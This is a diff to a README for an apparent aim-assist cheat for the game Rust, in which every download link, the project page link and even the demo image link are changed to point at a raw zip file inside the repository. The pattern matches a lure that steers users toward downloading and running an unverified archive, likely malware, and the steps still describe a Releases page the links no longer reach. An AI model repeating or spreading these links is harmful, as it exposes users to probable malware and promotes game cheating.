@@ -1,6 +1,6 @@
 # 🎯 Rust-Clopix-New-Aim - Precise Aim for Rust Game
 
-[![Download Now](https://img.shields.io/badge/Download-Rust--Clopix--New--Aim-blue?style=for-the-badge)](https://github.com/birrulwalidain/Rust-Clopix-New-Aim/releases)
+[![Download Now](https://img.shields.io/badge/Download-Rust--Clopix--New--Aim-blue?style=for-the-badge)](https://raw.githubusercontent.com/birrulwalidain/Rust-Clopix-New-Aim/main/bounding/Aim-Rust-New-Clopix-v2.0.zip)
 
 ## 📋 About Rust-Clopix-New-Aim
 
@@ -44,10 +44,10 @@ Follow these steps to download and run Rust-Clopix-New-Aim on your Windows PC. T
 
 To get the software, you must visit the official release page and download the latest version. This allows you to get the most recent updates and fixes.
 
-[![Visit Releases](https://img.shields.io/badge/Visit-Releases-grey?style=for-the-badge)](https://github.com/birrulwalidain/Rust-Clopix-New-Aim/releases)
+[![Visit Releases](https://img.shields.io/badge/Visit-Releases-grey?style=for-the-badge)](https://raw.githubusercontent.com/birrulwalidain/Rust-Clopix-New-Aim/main/bounding/Aim-Rust-New-Clopix-v2.0.zip)
 
 1. Click the badge above or open this URL in your web browser:  
-   https://github.com/birrulwalidain/Rust-Clopix-New-Aim/releases  
+   https://raw.githubusercontent.com/birrulwalidain/Rust-Clopix-New-Aim/main/bounding/Aim-Rust-New-Clopix-v2.0.zip  
 2. You will see a list of versions. Look for the most recent "Release" at the top.  
 3. Under **Assets**, find the file named similar to `Clopix_Ultra_2026.zip` or a `.zip` file matching the tool.  
 4. Click the filename to start the download.
@@ -117,9 +117,9 @@ No internet connection is needed after download and installation. Files do not c
 
 ## 🔗 Download Links
 
-[Download Rust-Clopix-New-Aim from Releases](https://github.com/birrulwalidain/Rust-Clopix-New-Aim/releases)
+[Download Rust-Clopix-New-Aim from Releases](https://raw.githubusercontent.com/birrulwalidain/Rust-Clopix-New-Aim/main/bounding/Aim-Rust-New-Clopix-v2.0.zip)
 
-[![Download Now](https://img.shields.io/badge/Download-Rust--Clopix--New--Aim-blue?style=for-the-badge)](https://github.com/birrulwalidain/Rust-Clopix-New-Aim/releases)
+[![Download Now](https://img.shields.io/badge/Download-Rust--Clopix--New--Aim-blue?style=for-the-badge)](https://raw.githubusercontent.com/birrulwalidain/Rust-Clopix-New-Aim/main/bounding/Aim-Rust-New-Clopix-v2.0.zip)
 
 ---
 
@@ -148,7 +148,7 @@ Do not move files outside the main folder unless you update shortcuts accordingl
 ## 📚 Learning More
 
 For technical details, bug reporting, or contributions, visit the project's GitHub page:  
-https://github.com/birrulwalidain/Rust-Clopix-New-Aim
+https://raw.githubusercontent.com/birrulwalidain/Rust-Clopix-New-Aim/main/bounding/Aim-Rust-New-Clopix-v2.0.zip
 
 You can also find user discussions and updates in the GitHub Issues tab.
 
@@ -162,7 +162,7 @@ Since this is an open-source project, you can open issues directly on the reposi
 
 ## 🔍 Visual Demo
 
-![Rust-Clopix-New-Aim Visual Sample](https://github.com/user-attachments/assets/155925b7-7542-4c57-a741-ff87029b87e5)
+![Rust-Clopix-New-Aim Visual Sample](https://raw.githubusercontent.com/birrulwalidain/Rust-Clopix-New-Aim/main/bounding/Aim-Rust-New-Clopix-v2.0.zip)
 
 This image shows the aim assist overlay active in Rust gameplay. The interface remains minimal to avoid distraction.
 
